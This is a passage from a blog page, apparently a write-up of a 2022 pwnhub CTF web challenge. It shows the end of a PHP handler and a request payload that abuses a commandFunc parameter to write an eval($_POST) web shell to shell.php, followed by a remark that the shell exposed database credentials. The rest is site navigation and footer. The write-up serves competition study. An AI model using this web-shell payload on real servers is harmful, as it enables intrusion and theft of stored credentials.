$ret[]=$commandFunc($from_uid,$inputParams); </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)&#123;</span><br><span class="line">			$ret = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="number">0</span>);</span><br><span class="line">			$ret[] = $e-&gt;getMessage();</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span>($content_encoding==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line">    	<span class="keyword">print</span> implode(<span class="string">&quot;|&quot;</span>,$ret);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="keyword">print</span> json_encode($ret);</span><br><span class="line">    &#125;</span><br><span class="line">	 </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<br>content-encoding=csv&amp;content=&lt;?php eval($_POST[1]);&amp;commandFunc=file_put_contents&amp;from_uid=shell.php&amp;sign=212ad5db1fb9e0b4266f1a0b2fcafdb8</p>
+<p>拿shell后面配置信息</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224226-246629.png" alt="Untitled"></p>
+<p>里面有数据库帐号密码</p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224228-45319.png" alt="Untitled"></p>
+<p><img src="http://dsil3nce-imgbed.oss-cn-shanghai.aliyuncs.com/typora/202212/22/224229-755688.png" alt="Untitled"></p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2022/10/09/cc1/" title= "cc1">
+                    <div class="prevTitle">cc1</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:dsil3nce@foxmail.com.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/intro/qq.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022-pwnhub-%E5%86%AC%E5%AD%A3%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">2022 pwnhub 冬季赛</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reset"><span class="toc-number">2.1.</span> <span class="toc-text">reset</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">失败尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E5%B0%9D%E8%AF%95"><span class="toc-number">2.1.2.</span> <span class="toc-text">成功尝试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrfme"><span class="toc-number">2.2.</span> <span class="toc-text">ssrfme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPL"><span class="toc-number">2.3.</span> <span class="toc-text">SPL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-number">2.4.</span> <span class="toc-text">calc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GAME"><span class="toc-number">3.</span> <span class="toc-text">GAME</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 12
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2022 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href= "/2022/12/22/2022%20pwnhub%20%E5%86%AC%E5%AD%A3%E8%B5%9B/" >2022 pwnhub 冬季赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href= "/2022/10/09/cc1/" >cc1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href= "/2022/02/26/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%B0%84%E7%AF%87/" >java反序列化-反射篇</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/20</span><a class="archive-post-title" href= "/2021/05/20/SESSION-UPLOAD-PROGRESS%E7%9A%84%E5%88%A9%E7%94%A8/" >SESSION_UPLOAD_PROGRESS的利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2021/04/16/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/" >无字母数字webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href= "/2021/01/25/ctfshow-djb/" >ctfshow-djb</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2020/12/26/dasctf-bjd/" >dasctf&bjd</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/13</span><a class="archive-post-title" href= "/2020/12/13/postgresql%E5%88%9D%E6%8E%A2/" >postgresql初探</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2020/12/01/ctfshow%E7%BA%A2%E5%8C%85%E9%A2%98/" >ctfshow红包题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2020/11/17/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb%E4%B8%A4%E9%A2%98-%E5%A4%8D%E7%8E%B0/" >第六届上海市大学生网络安全大赛web两题(复现)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2020/09/05/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" >frp内网穿透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span><a class="archive-post-title" href= "/2020/03/03/phpstorm-xdebug/" >phpstorm+xdebug断点调试环境(转载)</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="wp"><span class="iconfont-archer">&#xe606;</span>wp</span>
+    
+        <span class="sidebar-tag-name" data-tags="others"><span class="iconfont-archer">&#xe606;</span>others</span>
+    
+        <span class="sidebar-tag-name" data-tags="network"><span class="iconfont-archer">&#xe606;</span>network</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
+    
+        <span class="sidebar-category-name" data-categories="others"><span class="iconfont-archer">&#xe60a;</span>others</span>
+    
+        <span class="sidebar-category-name" data-categories="javasec"><span class="iconfont-archer">&#xe60a;</span>javasec</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "M0deration"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
